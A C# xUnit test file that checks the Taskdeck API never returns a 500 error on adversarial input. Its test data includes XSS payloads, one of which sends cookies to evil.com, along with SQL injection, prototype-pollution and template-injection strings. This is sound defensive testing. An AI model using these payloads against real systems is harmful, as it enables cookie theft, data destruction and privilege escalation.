using System.Net;
using System.Net.Http.Json;
using System.Text;
using FluentAssertions;
using Taskdeck.Api.Tests.Support;
using Taskdeck.Application.DTOs;
using Xunit;

namespace Taskdeck.Api.Tests;

/// <summary>
/// Adversarial tests that send raw JSON to API endpoints to exercise edge cases
/// that typed DTO serialization cannot reach: floating-point positions, integer overflow,
/// type mismatches, duplicate board names, and card description boundary values.
/// Key property: NO 500 Internal Server Error from any malformed input.
/// </summary>
public class RawJsonAdversarialApiTests : IClassFixture<TestWebApplicationFactory>
{
    private readonly TestWebApplicationFactory _factory;
    private readonly HttpClient _client;
    private bool _isAuthenticated;

    public RawJsonAdversarialApiTests(TestWebApplicationFactory factory)
    {
        _factory = factory;
        _client = factory.CreateClient();
    }

    private async Task EnsureAuthenticatedAsync()
    {
        if (_isAuthenticated) return;
        await ApiTestHarness.AuthenticateAsync(_client, "raw-json-adversarial");
        _isAuthenticated = true;
    }

    // ─────────────────────── Card position as float/string/boundary via raw JSON ───────────────────────

    [Theory]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": 3.14}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": -1}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": 2147483647}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": -2147483648}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": 9999999999999}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": \"not-a-number\"}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": null}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": true}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"position\": [1,2,3]}")]
    public async Task CreateCard_WithAdversarialPosition_NeverReturns500(string bodyTemplate)
    {
        await EnsureAuthenticatedAsync();

        // Create board and column
        var boardResponse = await _client.PostAsJsonAsync("/api/boards",
            new CreateBoardDto($"pos-test-{Guid.NewGuid():N}", null));
        boardResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var board = await boardResponse.Content.ReadFromJsonAsync<BoardDto>();

        var colResponse = await _client.PostAsJsonAsync(
            $"/api/boards/{board!.Id}/columns",
            new CreateColumnDto(board.Id, "TestCol", null, null));
        colResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var col = await colResponse.Content.ReadFromJsonAsync<ColumnDto>();

        // Substitute actual IDs into the raw JSON
        var body = bodyTemplate
            .Replace("BOARD_ID", board.Id.ToString())
            .Replace("COL_ID", col!.Id.ToString());

        var content = new StringContent(body, Encoding.UTF8, "application/json");
        var response = await _client.PostAsync($"/api/boards/{board.Id}/cards", content);

        ((int)response.StatusCode).Should().BeLessThan(500,
            $"Card creation returned 500 for position edge case: {bodyTemplate}");
    }

    // ─────────────────────── Card description adversarial content via API ───────────────────────

    [Theory]
    [InlineData("")]
    [InlineData("\u0000\u0001\u0002\u0003")]
    [InlineData("<script>alert(document.cookie)</script>")]
    [InlineData("<img src=x onerror=\"fetch('//evil.com?c='+document.cookie)\">")]
    [InlineData("<svg><animate onbegin=alert(1) attributeName=x dur=1s>")]
    [InlineData("'; DROP TABLE cards; --")]
    [InlineData("\uFEFF\u200B\u202E\u0301")]
    [InlineData("{\"__proto__\":{\"isAdmin\":true}}")]
    [InlineData("{{constructor.constructor('return this')()}}")]
    [InlineData("${7*7}")]
    [InlineData("#{7*7}")]
    public async Task CreateCard_WithAdversarialDescription_NeverReturns500(string description)
    {
        await EnsureAuthenticatedAsync();

        var boardResponse = await _client.PostAsJsonAsync("/api/boards",
            new CreateBoardDto($"desc-test-{Guid.NewGuid():N}", null));
        boardResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var board = await boardResponse.Content.ReadFromJsonAsync<BoardDto>();

        var colResponse = await _client.PostAsJsonAsync(
            $"/api/boards/{board!.Id}/columns",
            new CreateColumnDto(board.Id, "TestCol", null, null));
        colResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var col = await colResponse.Content.ReadFromJsonAsync<ColumnDto>();

        var response = await _client.PostAsJsonAsync(
            $"/api/boards/{board.Id}/cards",
            new CreateCardDto(board.Id, col!.Id, "ValidTitle", description, null, null));

        ((int)response.StatusCode).Should().BeLessThan(500,
            $"Card creation returned 500 for description: {description}");

        if (response.IsSuccessStatusCode)
        {
            var card = await response.Content.ReadFromJsonAsync<CardDto>();
            card.Should().NotBeNull();
            card!.Description.Should().Be(description,
                "adversarial description should be stored verbatim");
        }
    }

    // ─────────────────────── Card description boundary lengths ───────────────────────

    [Theory]
    [InlineData(0)]
    [InlineData(1)]
    [InlineData(2000)]
    [InlineData(2001)]
    [InlineData(100_000)]
    public async Task CreateCard_WithVariousDescriptionLengths_NeverReturns500(int length)
    {
        await EnsureAuthenticatedAsync();

        var boardResponse = await _client.PostAsJsonAsync("/api/boards",
            new CreateBoardDto($"desc-len-{Guid.NewGuid():N}", null));
        boardResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var board = await boardResponse.Content.ReadFromJsonAsync<BoardDto>();

        var colResponse = await _client.PostAsJsonAsync(
            $"/api/boards/{board!.Id}/columns",
            new CreateColumnDto(board.Id, "TestCol", null, null));
        colResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var col = await colResponse.Content.ReadFromJsonAsync<ColumnDto>();

        var description = length == 0 ? "" : new string('d', length);
        var response = await _client.PostAsJsonAsync(
            $"/api/boards/{board.Id}/cards",
            new CreateCardDto(board.Id, col!.Id, "ValidTitle", description, null, null));

        ((int)response.StatusCode).Should().BeLessThan(500,
            $"Card creation returned 500 for description of {length} chars");
    }

    // ─────────────────────── Duplicate board names ───────────────────────

    [Fact]
    public async Task CreateBoard_DuplicateNames_DoesNotReturn500()
    {
        await EnsureAuthenticatedAsync();

        var name = $"duplicate-test-{Guid.NewGuid():N}";

        var first = await _client.PostAsJsonAsync("/api/boards", new CreateBoardDto(name, null));
        first.StatusCode.Should().Be(HttpStatusCode.Created);

        // Second board with same name
        var second = await _client.PostAsJsonAsync("/api/boards", new CreateBoardDto(name, null));
        ((int)second.StatusCode).Should().BeLessThan(500,
            "Duplicate board name should not cause 500");
    }

    [Fact]
    public async Task CreateBoard_DuplicateUnicodeNames_DoesNotReturn500()
    {
        await EnsureAuthenticatedAsync();

        var unicodeNames = new[]
        {
            "田中太郎のボード",
            "مرحبا بالعالم",
            "👨‍👩‍👧‍👦 Family Board",
            "Board\u200BName",  // zero-width space
            "e\u0301",          // combining character
        };

        foreach (var name in unicodeNames)
        {
            var first = await _client.PostAsJsonAsync("/api/boards", new CreateBoardDto(name, null));
            ((int)first.StatusCode).Should().BeLessThan(500,
                $"First board creation with unicode name '{name}' should not return 500");

            var second = await _client.PostAsJsonAsync("/api/boards", new CreateBoardDto(name, null));
            ((int)second.StatusCode).Should().BeLessThan(500,
                $"Duplicate unicode board name '{name}' should not return 500");
        }
    }

    // ─────────────────────── Card creation with extra unknown fields ───────────────────────

    [Theory]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"__proto__\": {\"admin\": true}}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"constructor\": {\"prototype\": {}}}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"unknownField1\": \"val1\", \"unknownField2\": 42}")]
    [InlineData("{\"boardId\": \"BOARD_ID\", \"columnId\": \"COL_ID\", \"title\": \"test\", \"isAdmin\": true, \"role\": \"superuser\"}")]
    public async Task CreateCard_WithExtraUnknownFields_NeverReturns500(string bodyTemplate)
    {
        await EnsureAuthenticatedAsync();

        var boardResponse = await _client.PostAsJsonAsync("/api/boards",
            new CreateBoardDto($"extra-fields-{Guid.NewGuid():N}", null));
        boardResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var board = await boardResponse.Content.ReadFromJsonAsync<BoardDto>();

        var colResponse = await _client.PostAsJsonAsync(
            $"/api/boards/{board!.Id}/columns",
            new CreateColumnDto(board.Id, "TestCol", null, null));
        colResponse.StatusCode.Should().Be(HttpStatusCode.Created);
        var col = await colResponse.Content.ReadFromJsonAsync<ColumnDto>();

        var body = bodyTemplate
            .Replace("BOARD_ID", board.Id.ToString())
            .Replace("COL_ID", col!.Id.ToString());

        var content = new StringContent(body, Encoding.UTF8, "application/json");
        var response = await _client.PostAsync($"/api/boards/{board.Id}/cards", content);

        ((int)response.StatusCode).Should().BeLessThan(500,
            $"Card creation with extra fields returned 500: {bodyTemplate}");
    }

    // ─────────────────────── Board creation with extra unknown fields ───────────────────────

    [Theory]
    [InlineData("{\"name\": \"test\", \"__proto__\": {\"admin\": true}}")]
    [InlineData("{\"name\": \"test\", \"constructor\": {\"prototype\": {}}}")]
    [InlineData("{\"name\": \"test\", \"extraField\": \"ignored\", \"anotherExtra\": [1,2,3]}")]
    public async Task CreateBoard_WithExtraUnknownFields_NeverReturns500(string body)
    {
        await EnsureAuthenticatedAsync();

        var content = new StringContent(body, Encoding.UTF8, "application/json");
        var response = await _client.PostAsync("/api/boards", content);

        ((int)response.StatusCode).Should().BeLessThan(500,
            $"Board creation with extra fields returned 500: {body}");
    }

    // ─────────────────────── Chat session creation with adversarial title ───────────────────────

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("'; DROP TABLE chat_sessions; --")]
    [InlineData("\u0000\uFEFF\u200B")]
    [InlineData("👨‍👩‍👧‍👦")]
    [InlineData("{\"nested\": true}")]
    [InlineData("")]
    [InlineData(" ")]
    public async Task CreateChatSession_WithAdversarialTitle_NeverReturns500(string title)
    {
        await EnsureAuthenticatedAsync();

        var boardId = await ApiTestHarness.CreateBoardWithColumnAsync(_client, "chat-adversarial");

        var response = await _client.PostAsJsonAsync("/api/llm/chat/sessions",
            new CreateChatSessionDto(title, boardId));

        ((int)response.StatusCode).Should().BeLessThan(500,
            $"Chat session creation returned 500 for title: {title}");
    }

    // ─────────────────────── Chat message with adversarial content ───────────────────────

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("'; DROP TABLE chat_messages; --")]
    [InlineData("\u0000\u0001\u0002")]
    [InlineData("👨‍👩‍👧‍👦 emoji message")]
    [InlineData("{\"action\": \"delete\", \"target\": \"all_boards\"}")]
    [InlineData("")]
    [InlineData(" ")]
    public async Task SendChatMessage_WithAdversarialContent_NeverReturns500(string messageContent)
    {
        await EnsureAuthenticatedAsync();

        var boardId = await ApiTestHarness.CreateBoardWithColumnAsync(_client, "chat-msg-adversarial");

        // Create session
        var sessionResponse = await _client.PostAsJsonAsync("/api/llm/chat/sessions",
            new CreateChatSessionDto("Test Session", boardId));

        if (!sessionResponse.IsSuccessStatusCode) return; // Skip if session creation fails

        var session = await sessionResponse.Content.ReadFromJsonAsync<ChatSessionDto>();

        var response = await _client.PostAsJsonAsync(
            $"/api/llm/chat/sessions/{session!.Id}/messages",
            new SendChatMessageDto(messageContent));

        ((int)response.StatusCode).Should().BeLessThan(500,
            $"Chat message sending returned 500 for content: {messageContent}");
    }

    // ─────────────────────── Capture creation with binary-like content ───────────────────────

    [Fact]
    public async Task CaptureItem_WithAllControlChars_NeverReturns500()
    {
        await EnsureAuthenticatedAsync();

        // Generate a string with all ASCII control characters (0-31)
        var chars = new char[32];
        for (int i = 0; i < 32; i++)
        {
            chars[i] = (char)i;
        }
        var controlString = "prefix" + new string(chars) + "suffix";

        var response = await _client.PostAsJsonAsync("/api/capture/items",
            new CreateCaptureItemDto(null, controlString));

        ((int)response.StatusCode).Should().BeLessThan(500,
            "Capture with all control characters should not return 500");
    }

    [Fact]
    public async Task CaptureItem_WithEveryUnicodeBlockSample_NeverReturns500()
    {
        await EnsureAuthenticatedAsync();

        // Sample from major Unicode blocks
        var unicodeSamples = new[]
        {
            "\u0041",        // Basic Latin (A)
            "\u00C0",        // Latin Extended-A
            "\u0100",        // Latin Extended-B
            "\u0370",        // Greek
            "\u0400",        // Cyrillic
            "\u0500",        // Cyrillic Supplement
            "\u0590",        // Hebrew
            "\u0600",        // Arabic
            "\u0900",        // Devanagari
            "\u0E00",        // Thai
            "\u1100",        // Hangul Jamo
            "\u3000",        // CJK Symbols
            "\u4E00",        // CJK Unified
            "\uAC00",        // Hangul Syllables
            "\uFE00",        // Variation Selectors
            "\uFF00",        // Halfwidth/Fullwidth
            "\uFFFD",        // Replacement Character
            "\U0001F600",    // Emoticons (surrogate pair)
        };

        var text = string.Join(" ", unicodeSamples);
        var response = await _client.PostAsJsonAsync("/api/capture/items",
            new CreateCaptureItemDto(null, text));

        ((int)response.StatusCode).Should().BeLessThan(500,
            "Capture with Unicode block samples should not return 500");
    }
}
